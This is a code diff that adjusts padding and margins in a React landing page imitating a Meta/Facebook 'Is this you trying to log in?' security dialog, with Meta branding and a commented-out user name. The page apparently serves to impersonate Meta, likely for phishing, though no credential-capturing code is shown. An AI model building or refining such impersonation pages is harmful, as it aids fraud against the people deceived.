@@ -11,7 +11,7 @@ export default function Landing() {
         aria-labelledby="dialog-title"
       >
         {/* Header */}
-        <div className="sticky mt-3 top-0 z-10 flex items-center justify-between min-h-16 px-4 md:px-6">
+        <div className="sticky mt-3 top-0 z-10 flex items-center justify-between min-h-16 px-1 md:px-6">
           <div className="flex items-center ml-1 md:ml-2">
             <div className="flex items-center ml-2 md:ml-3">
               {/* Meta Logo */}
@@ -99,7 +99,7 @@ export default function Landing() {
         </div>
 
         {/* Content */}
-        <div className="flex-1 overflow-y-auto px-4 md:px-6 pb-5 pt-2.5">
+        <div className="flex-1 overflow-y-auto px-1 md:px-6 pb-5 pt-2.5">
           <div className="max-w-full px-2 md:px-4">
             <div className="relative">
               <div className="max-w-full">
@@ -107,7 +107,7 @@ export default function Landing() {
                   {/* <span className="text-meta-secondary text-sm font-medium mb-4">
                     Thanh • Facebook
                   </span> */}
-                  <h2 className="text-2xl font-semibold text-meta-text mb-5">
+                  <h2 className="text-2xl font-semibold text-meta-text mb-3">
                     Hello , Is this you trying to log in?
                   </h2>
                   <span className="text-meta-text text-base leading-tight">
@@ -186,7 +186,7 @@ export default function Landing() {
               </div>
 
               {/* Security Warning */}
-              <div className="mt-4">
+              <div className="mt-3">
                 <div className="flex items-start justify-start py-2.5">
                   <div className="flex flex-col flex-shrink-0 max-w-full relative">
                     <Shield className="h-6 w-6 text-meta-text" />
@@ -200,7 +200,7 @@ export default function Landing() {
               </div>
 
               {/* Action Buttons */}
-              <div className="mt-4">
+              <div className="mt-3">
                 <div className="relative w-full">
                   <Button className="w-full h-9 bg-meta-blue hover:bg-meta-blue/90 text-white text-sm font-medium rounded-[18px] px-4">
                     <span className="text-white text-sm font-medium truncate">
@@ -210,7 +210,7 @@ export default function Landing() {
                 </div>
               </div>
 
-              <div className="mt-4">
+              <div className="mt-3">
                 <div className="relative w-full">
                   <Button
                     variant="outline"
